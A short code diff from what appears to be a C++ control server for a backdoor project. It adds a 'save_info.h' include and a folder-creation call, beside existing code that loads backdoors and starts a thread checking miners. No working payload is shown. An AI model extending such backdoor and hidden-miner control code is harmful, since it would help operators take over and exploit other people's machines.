@@ -3,6 +3,7 @@
 #include <thread>
 #include "communication.h"
 #include "backdoor.h"
+#include "save_info.h"
 #define IP "127.0.0.1"
 #define PORT 8000
 
@@ -83,6 +84,7 @@ public:
     
     
     Server(Communication *c){
+        Save_info::create_folder();
         this->c = c;
         backdoors = this->c->get_backdoors();
         std::thread check_minining(check_miners);
